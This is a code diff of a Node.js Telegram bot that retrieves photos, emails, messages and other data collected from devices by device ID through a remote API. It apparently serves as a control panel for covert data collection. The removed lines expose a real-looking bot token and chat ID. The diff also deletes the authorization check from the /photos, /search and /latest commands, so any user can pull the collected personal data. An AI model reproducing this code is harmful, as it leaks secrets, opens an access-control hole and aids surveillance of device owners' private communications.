@@ -1,9 +1,9 @@
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 
-// 🔐 SECURITY: @rosee_ai_bot - Jedarius's authorized access only
-const AUTHORIZED_CHAT_ID = process.env.YOUR_CHAT_ID || '6523159355';
-const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8117061195:AAFcR6ytNLj1kS6xiLRlCe36tQCOf50dmRA';
+// 🔐 SECURITY: Replace with YOUR Telegram Chat ID (get from @userinfobot)
+const AUTHORIZED_CHAT_ID = process.env.YOUR_CHAT_ID || 'YOUR_CHAT_ID_HERE';
+const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
 const NUPI_API = process.env.NUPI_API || 'https://nupidesktopai.com';
 
 const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
@@ -138,30 +138,28 @@ bot.onText(/\/messages(?:\s+(.+))?/, async (msg, match) => {
             message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
         });
         
-            if (response.data.count > 10) {
-                message += `\n_Showing 10 of ${response.data.count} messages_`;
-            }
-            
-            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
-            
-        } catch (error) {
-            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+        if (response.data.count > 10) {
+            message += `\n_Showing 10 of ${response.data.count} messages_`;
         }
-    });
+        
+        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+        
+    } catch (error) {
+        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+    }
 });
 
 // /photos command - Recall all photos
 bot.onText(/\/photos(?:\s+(.+))?/, async (msg, match) => {
-    checkAuth(msg, async () => {
-        const chatId = msg.chat.id;
-        const deviceId = match[1];
-        
-        if (!deviceId) {
-            bot.sendMessage(chatId, '❌ Please provide a device ID\nUsage: /photos <deviceId>');
-            return;
-        }
-        
-        try {
+    const chatId = msg.chat.id;
+    const deviceId = match[1];
+    
+    if (!deviceId) {
+        bot.sendMessage(chatId, '❌ Please provide a device ID\nUsage: /photos <deviceId>');
+        return;
+    }
+    
+    try {
         bot.sendMessage(chatId, '🖼️ Searching for photos...');
         
         const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
@@ -191,26 +189,24 @@ bot.onText(/\/photos(?:\s+(.+))?/, async (msg, match) => {
         
         bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
         
-            // Send actual photo URLs
-            response.data.results.slice(0, 3).forEach(result => {
-                try {
-                    bot.sendPhoto(chatId, result.data.url).catch(() => {});
-                } catch (e) {}
-            });
-            
-        } catch (error) {
-            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
-        }
-    });
+        // Send actual photo URLs
+        response.data.results.slice(0, 3).forEach(result => {
+            try {
+                bot.sendPhoto(chatId, result.data.url).catch(() => {});
+            } catch (e) {}
+        });
+        
+    } catch (error) {
+        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+    }
 });
 
 // /search command - Search all collected data
 bot.onText(/\/search (.+)/, async (msg, match) => {
-    checkAuth(msg, async () => {
-        const chatId = msg.chat.id;
-        const query = match[1];
-        
-        try {
+    const chatId = msg.chat.id;
+    const query = match[1];
+    
+    try {
         bot.sendMessage(chatId, `🔍 Searching for: "${query}"...`);
         
         const response = await axios.post(`${NUPI_API}/api/user-data/search`, {
@@ -233,30 +229,28 @@ bot.onText(/\/search (.+)/, async (msg, match) => {
             message += `Collected: ${new Date(result.collected).toLocaleString()}\n\n`;
         });
         
-            if (response.data.count > 5) {
-                message += `\n_Showing 5 of ${response.data.count} results_`;
-            }
-            
-            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
-            
-        } catch (error) {
-            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+        if (response.data.count > 5) {
+            message += `\n_Showing 5 of ${response.data.count} results_`;
         }
-    });
+        
+        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+        
+    } catch (error) {
+        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+    }
 });
 
 // /latest command - Get latest data
 bot.onText(/\/latest(?:\s+(.+))?/, async (msg, match) => {
-    checkAuth(msg, async () => {
-        const chatId = msg.chat.id;
-        const deviceId = match[1];
-        
-        if (!deviceId) {
-            bot.sendMessage(chatId, '❌ Please provide a device ID\nUsage: /latest <deviceId>');
-            return;
-        }
-        
-        try {
+    const chatId = msg.chat.id;
+    const deviceId = match[1];
+    
+    if (!deviceId) {
+        bot.sendMessage(chatId, '❌ Please provide a device ID\nUsage: /latest <deviceId>');
+        return;
+    }
+    
+    try {
         bot.sendMessage(chatId, '📊 Fetching latest data...');
         
         const response = await axios.get(`${NUPI_API}/api/user-data/latest/${deviceId}`);
@@ -279,16 +273,15 @@ bot.onText(/\/latest(?:\s+(.+))?/, async (msg, match) => {
             message += `*Recent Email:*\n${JSON.stringify(data.emails[0]).substring(0, 200)}...\n\n`;
         }
         
-            if (data.messages.length > 0) {
-                message += `*Recent Message:*\n${JSON.stringify(data.messages[0]).substring(0, 200)}...\n`;
-            }
-            
-            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
-            
-        } catch (error) {
-            bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+        if (data.messages.length > 0) {
+            message += `*Recent Message:*\n${JSON.stringify(data.messages[0]).substring(0, 200)}...\n`;
         }
-    });
+        
+        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+        
+    } catch (error) {
+        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+    }
 });
 
 // 🎯 REAL-TIME STREAM - See latest collections
